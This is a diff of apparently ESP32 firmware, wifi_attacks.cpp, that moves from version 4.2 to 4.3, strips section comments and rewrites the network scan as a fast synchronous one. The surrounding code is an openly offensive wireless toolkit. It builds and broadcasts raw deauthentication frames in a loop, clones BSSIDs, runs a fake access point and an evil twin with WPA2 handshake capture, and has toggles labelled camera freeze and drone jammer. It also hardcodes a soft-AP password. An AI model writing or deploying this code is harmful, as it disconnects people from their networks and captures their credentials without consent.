@@ -1,13 +1,10 @@
 // ============================================================
-// wifi_attacks.cpp - v4.2 Async Edition
+// wifi_attacks.cpp - v4.3 Fast Scan Edition
 // ============================================================
 #include <WiFi.h>
 #include <esp_wifi.h>
 #include "config.h"
 
-// ============================================================
-// CONTADORES E ESTADO
-// ============================================================
 static uint32_t deauthPacketCount = 0;
 static uint32_t deauthSuccessCount = 0;
 static uint8_t  deauthTargetChannel = 0;
@@ -15,9 +12,6 @@ static uint8_t  deauthTargetBSSID[6] = {0};
 static char     deauthTargetSSID[33] = {0};
 static uint8_t  deauthTargetAuth = 0;
 
-// ============================================================
-// BSSID CLONE
-// ============================================================
 static bool bssidCloneActive = false;
 static uint8_t originalAPMac[6] = {0};
 static uint8_t cloneChannel = 0;
@@ -25,9 +19,6 @@ static char cloneSSID[33] = {0};
 static unsigned long cloneStartTime = 0;
 static uint8_t cloneHealthCheckFailures = 0;
 
-// ============================================================
-// CLIENT DISCOVERY
-// ============================================================
 #define MAX_CLIENTS 16
 static uint8_t discoveredClients[MAX_CLIENTS][6];
 static uint8_t clientCount = 0;
@@ -111,9 +102,6 @@ static void stopPromiscuous() {
     promiscuousActive = false;
 }
 
-// ============================================================
-// RAW FRAME HELPERS
-// ============================================================
 static uint16_t deauthSeqNum = 0;
 
 static bool raw_tx(const uint8_t* frame, size_t len) {
@@ -140,9 +128,6 @@ static void buildDeauthFrame(uint8_t* frame, const uint8_t* da, const uint8_t* s
     frame[25] = 0x00;
 }
 
-// ============================================================
-// DEAUTH BURST
-// ============================================================
 static void deauthBurst() {
     uint8_t frame[32];
     const uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
@@ -156,9 +141,6 @@ static void deauthBurst() {
     raw_tx(frame, 26);
 }
 
-// ============================================================
-// HELPERS
-// ============================================================
 static bool isSoftAPActive() {
     wifi_mode_t mode;
     esp_wifi_get_mode(&mode);
@@ -166,39 +148,22 @@ static bool isSoftAPActive() {
 }
 
 // ============================================================
-// SCAN WIFI - ASSÍNCRONO E NÃO BLOQUEANTE
+// SCAN WIFI - RÁPIDO E NÃO TRAVANTE (150ms por canal)
 // ============================================================
-volatile bool scanInProgress = false;
-
 void scanNetworks() {
-    if (scanInProgress) {
-        return;
-    }
-    
     networkCount = 0;
-    scanInProgress = true;
-    
+    Serial.println("[WiFi] Starting FAST sync network scan...");
+
     wifi_mode_t modeBefore = WiFi.getMode();
     if (modeBefore == WIFI_AP) {
         WiFi.mode(WIFI_AP_STA);
         delay(50);
     }
-    
-    WiFi.scanNetworks(true, false, false, 200);
-}
 
-bool isScanRunning() { 
-    return (WiFi.scanComplete() == -1); 
-}
+    // 150ms por canal = ~2 segundos no total. Não trava o WebServer nem o Watchdog.
+    int n = WiFi.scanNetworks(false, true, false, 150);
+    Serial.printf("[WiFi] Scan found %d networks\n", n);
 
-bool isScanComplete() { 
-    return (WiFi.scanComplete() >= 0); 
-}
-
-void collectScanResults() {
-    int n = WiFi.scanComplete();
-    if (n < 0) return; 
-    
     if (n > 0) {
         networkCount = (n > MAX_NETWORKS) ? MAX_NETWORKS : n;
         for (int i = 0; i < networkCount; i++) {
@@ -209,9 +174,17 @@ void collectScanResults() {
             scannedNetworks[i].channel = WiFi.channel(i);
             scannedNetworks[i].encrypted = (WiFi.encryptionType(i) != WIFI_AUTH_OPEN);
         }
+        WiFi.scanDelete();
     }
-    WiFi.scanDelete();
-    scanInProgress = false;
+
+    if (WiFi.getMode() == WIFI_STA) {
+        WiFi.mode(WIFI_AP_STA);
+        delay(100);
+    }
+    if (WiFi.softAPIP() == IPAddress(0,0,0,0)) {
+        WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
+        WiFi.softAP("CrazyCat", "crazycat123", 6, 0, 4);
+    }
 }
 
 uint8_t getNetworkCount() { return networkCount; }
@@ -220,9 +193,6 @@ NetworkInfo* getNetwork(uint8_t index) {
     return nullptr;
 }
 
-// ============================================================
-// BSSID CLONE
-// ============================================================
 static void startBssidClone(uint8_t networkIndex) {
     if (networkIndex >= networkCount) return;
     NetworkInfo* target = &scannedNetworks[networkIndex];
@@ -304,9 +274,6 @@ void stopBssidClone() {
     bssidCloneActive = false;
 }
 
-// ============================================================
-// DEAUTH
-// ============================================================
 void startDeauth(uint8_t networkIndex) {
     if (networkIndex >= networkCount) return;
     deauthPacketCount = 0;
@@ -327,9 +294,6 @@ void stopDeauth() {
     deauthSuccessCount = 0;
 }
 
-// ============================================================
-// DEAUTH LOOP
-// ============================================================
 bool deauthLoop() {
     if (!deauthActive) return false;
     deauthBurst();
@@ -354,9 +318,6 @@ bool deauthLoop() {
     return true;
 }
 
-// ============================================================
-// GETTERS
-// ============================================================
 uint32_t getDeauthPacketCount() { return deauthPacketCount; }
 uint32_t getDeauthSuccessCount() { return deauthSuccessCount; }
 uint8_t  getDeauthSuccessPercent() {
@@ -368,9 +329,6 @@ uint8_t  getDeauthTargetChannel() { return deauthTargetChannel; }
 const uint8_t* getDeauthTargetBSSID() { return deauthTargetBSSID; }
 bool     getDeauthTargetEncrypted() { return deauthTargetAuth != 0; }
 
-// ============================================================
-// FAKE AP / EVIL TWIN
-// ============================================================
 void startFakeAP(const char* ssid) {
     WiFi.mode(WIFI_AP);
     WiFi.softAP(ssid, "12345678", 1, 0, 8);
@@ -387,9 +345,6 @@ void stopFakeAP() {
 
 bool isFakeAPActive() { return fakeAPEnabled; }
 
-// ============================================================
-// EVIL TWIN WPA2 + HANDSHAKE CAPTURE
-// ============================================================
 void startEvilTwin(uint8_t networkIndex) {
     if (networkIndex >= networkCount) return;
 
@@ -463,9 +418,6 @@ void stopEvilTwin() {
     deauthSuccessCount = 0;
 }
 
-// ============================================================
-// REMOTE DEVICES
-// ============================================================
 void scanRemoteDevices() {
     remoteDeviceCount = 0;
     IPAddress gateway = WiFi.gatewayIP();
@@ -485,19 +437,14 @@ RemoteDevice* getRemoteDevice(uint8_t index) {
     return nullptr;
 }
 
-// ============================================================
-// CAMERA FREEZE / DRONE (NÃO BLOQUEANTES)
-// ============================================================
 void startCameraFreeze() {
     cameraFreezeActive = true;
 }
-
 void stopCameraFreeze() { cameraFreezeActive = false; }
 
 void startDroneJammer() {
     droneJammerActive = true;
 }
-
 void stopDroneJammer() { droneJammerActive = false; }
 
 struct DroneLocation {
